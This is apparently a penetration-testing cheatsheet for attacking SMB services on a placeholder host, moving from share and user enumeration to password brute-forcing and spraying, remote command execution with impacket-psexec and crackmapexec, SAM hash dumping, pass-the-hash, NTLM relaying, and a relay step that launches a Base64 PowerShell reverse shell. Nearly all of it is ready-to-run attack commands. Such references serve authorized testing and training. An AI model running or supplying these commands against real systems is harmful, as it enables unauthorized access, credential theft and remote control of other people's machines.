# SMB Enumeration Cheatsheet
## 1. Enumerate SMB Version and Scripts (nmap)
Gather detailed SMB service information.
```
sudo nmap -sV -sC -p139,445 target.com
```
- `-sV`: Detects service and version.
- `-sC`: Runs default scripts (e.g., `smb2-security-mode`, `smb2-time`).

## 2. Check Anonymous SMB Shares (smbclient)
Test for null session (anonymous) access to list shares.
```
smbclient -N -L //target.com
```
- `-N`: No password (null session).
- `-L`: Lists available shares.

## 3. Enumerate SMB Shares and Permissions (smbmap)
List shares and check permissions.
```
smbmap -H target.com
```
- `-H`: Specify target host.
- Use `-r sharename` to browse a specific share's contents.

## 4. Recursive SMB Share Enumeration (smbmap)
Browse files and directories in a share.
```
smbmap -H target.com -r notes
```
- `-r notes`: Recursively lists contents of the "notes" share.

## 5. Brute-Force SMB Credentials (crackmapexec)
Attempt SMB password spraying or brute-forcing.
```
crackmapexec smb target.com -u users.txt -p passwords.txt --local-auth
```
- `-u users.txt`: Username wordlist.
- `-p passwords.txt`: Password wordlist.
- `--local-auth`: For non-domain joined systems.

## 6. Enumerate SMB Directory Listing (smbmap)
List files in a share (if readable).
```
smbmap -H target.com -r sharename
```
- `-r sharename`: Browse files in the specified share.

## 7. Download Files from SMB (smbmap)
Retrieve files from an SMB share.
```
smbmap -H target.com --download "sharename\filename"
```
- `--download`: Downloads the specified file.

## 8. Upload Files to SMB (smbmap)
Test write permissions by uploading files.
```
smbmap -H target.com --upload localfile "sharename\filename"
```
- `--upload`: Uploads the specified file.

## 9. Null Session with RPC (rpcclient)
Connect to SMB using a null session for enumeration.
```
rpcclient -U'%' target.com
```
- `-U'%'`: Specifies null session (no username/password).

## 10. Automated SMB Enumeration (enum4linux-ng)
Automate SMB enumeration tasks.
```
./enum4linux-ng.py target.com -A -C
```
- `-A`: Perform all enumeration tasks.
- `-C`: Include additional checks (e.g., shares, users).

## 11. Remote Command Execution with Impacket (impacket-psexec)
Execute commands via SMB with valid credentials.
```
impacket-psexec administrator:'password'@target.com
```
- Connects using the provided username and password.

## 12. Remote Command Execution (crackmapexec)
Execute commands on the target with valid credentials.
```
crackmapexec smb target.com -u username -p password -x 'whoami' --exec-method smbexec
```
- `-x`: Run CMD command.
- `--exec-method smbexec`: Uses SMB-based execution.

## 13. Enumerate Logged-on Users (crackmapexec)
List users currently logged on.
```
crackmapexec smb target.com -u username -p password --loggedon-users
```
- `--loggedon-users`: Enumerates logged-on users.

## 14. Extract SAM Hashes (crackmapexec)
Dump SAM database hashes with admin privileges.
```
crackmapexec smb target.com -u username -p password --sam
```
- `--sam`: Dumps SAM hashes for local accounts.

## 15. Pass-the-Hash (crackmapexec)
Authenticate using NTLM hash instead of password.
```
crackmapexec smb target.com -u username -H ntlmhash
```
- `-H ntlmhash`: Use NTLM hash for authentication.

## 16. Capture and Relay NetNTLM Hashes (impacket-ntlmrelayx)
Dump SAM database by relaying captured hashes.
```
impacket-ntlmrelayx --no-http-server -smb2support -t target.com
```
- `--no-http-server`: Disables HTTP server.
- `-smb2support`: Enables SMB2 support.
- `-t`: Target host to relay to.

## 17. Execute Reverse Shell via Relay (impacket-ntlmrelayx)
Execute a PowerShell reverse shell after relaying hashes.
```
impacket-ntlmrelayx --no-http-server -smb2support -t target.com -c 'powershell -e <base64_reverse_shell>'
```
- `-c`: Executes the specified command (e.g., Base64-encoded PowerShell reverse shell).

## Tips
- Use SecLists for `users.txt` and `passwords.txt`.
- Check for misconfigurations (e.g., null sessions, excessive permissions).
- Be cautious with brute-forcing to avoid account lockouts.
- Ensure Responder’s SMB server is off in `Responder.conf` before using `impacket-ntlmrelayx`.